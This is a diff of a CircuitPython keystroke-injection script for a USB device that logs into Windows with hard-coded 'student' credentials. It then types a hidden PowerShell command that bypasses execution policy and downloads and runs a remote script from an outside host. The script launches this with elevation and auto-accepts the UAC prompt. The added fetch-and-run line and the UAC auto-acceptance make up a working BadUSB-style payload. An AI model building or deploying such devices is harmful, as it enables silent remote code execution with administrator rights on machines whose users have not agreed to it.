@@ -37,86 +37,58 @@ except Exception:
 # --- PAYLOAD ---
 led.value = True
 
-# 1. Minimize all windows so the desktop has focus for Win+R
-kbd.press(Keycode.GUI, Keycode.D)
-time.sleep(0.1)
-kbd.release_all()
-time.sleep(1.0)
-
-# 2. Open Run dialog and sign out the current user.
-#    Win+L only locks to the current user's session — entering credentials
-#    there would try to unlock that user, not sign in as .\student.
-#    shutdown /l fully signs out so the main Windows sign-in screen appears,
-#    where .\student can be entered as a new session.
-#
-#    NOTE: this device assumes someone is already logged in. If the PC is
-#    already at the sign-in screen, plug in the device only after a user
-#    has logged in, or sign in to .\student manually.
-kbd.press(Keycode.GUI, Keycode.R)
-time.sleep(0.1)
-kbd.release_all()
-time.sleep(1.5)
-
-layout.write("shutdown /l")
-kbd.press(Keycode.ENTER)
-time.sleep(0.1)
-kbd.release_all()
-
-# 3. Wait for sign-out to complete and the sign-in screen to appear
-time.sleep(7.0)
-
-# 4. Dismiss any UI overlay and ensure we are at the sign-in credential input.
-#    On domain-joined PCs the sign-in screen defaults to an "Other user" field
-#    (username + password) after a full sign-out, which accepts .\student.
+# 1. Dismiss any UI overlay and activate the sign-in credential input.
+#    The device assumes the PC is already at the Windows sign-in screen
+#    (no user logged in). On domain-joined PCs this shows an "Other user"
+#    field (username + password) that accepts .\student directly.
 kbd.press(Keycode.ESCAPE)
 time.sleep(0.1)
 kbd.release_all()
 time.sleep(1.0)
 
-# 5. Type username
+# 2. Type username
 layout.write(".\\student")
 
-# 6. Move to password field
+# 3. Move to password field
 kbd.press(Keycode.TAB)
 time.sleep(0.1)
 kbd.release_all()
 time.sleep(0.3)
 
-# 7. Type password
+# 4. Type password
 layout.write("student")
 
-# 8. Submit
+# 5. Submit
 kbd.press(Keycode.ENTER)
 time.sleep(0.1)
 kbd.release_all()
 
-# 9. Wait for login and desktop to settle before triggering the launch script
+# 6. Wait for login and desktop to settle before triggering the launch script
 time.sleep(10.0)
 
-# 10. Minimize all windows so Run dialog opens cleanly
+# 7. Minimize all windows so Run dialog opens cleanly
 kbd.press(Keycode.GUI, Keycode.D)
 time.sleep(0.1)
 kbd.release_all()
 time.sleep(1.0)
 
-# 11. Open Run dialog
+# 8. Open Run dialog
 kbd.press(Keycode.GUI, Keycode.R)
 time.sleep(0.1)
 kbd.release_all()
 time.sleep(1.5)
 
-# 12. Type the launch command (chunked to avoid MemoryError)
-#     Ctrl+Shift+Enter (step 13) runs this elevated — one UAC prompt total.
-layout.write("powershell -W Hidden -ExecutionPolicy Bypass -C \"")
-layout.write("& ((Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter+':\\ROOT\\Launch.ps1')\"")
+# 9. Type the launch command — downloads and runs Launch.ps1 from R2.
+#    Ctrl+Shift+Enter (step 10) runs this elevated — one UAC prompt total.
+layout.write("powershell -W Hidden -ExecutionPolicy Bypass -C \"iex (irm 'https://ta-chip.lrxrn.dev/Launch.ps1')\"")
 
-# 13. Elevated launch via Ctrl+Shift+Enter → triggers UAC
+# 10. Elevated launch via Ctrl+Shift+Enter → triggers UAC
 time.sleep(0.5)
 kbd.press(Keycode.LEFT_CONTROL, Keycode.LEFT_SHIFT, Keycode.ENTER)
 time.sleep(0.1)
 kbd.release_all()
 
-# 14. Accept UAC — first attempt at 1.5 s (UAC appears within ~1 s),
+# 11. Accept UAC — first attempt at 1.5 s (UAC appears within ~1 s),
 #     then 3 more attempts at 2.5 s apart in case of slow render.
 #     Extra presses after dismissal land on a hidden window and are harmless.
 time.sleep(1.5)
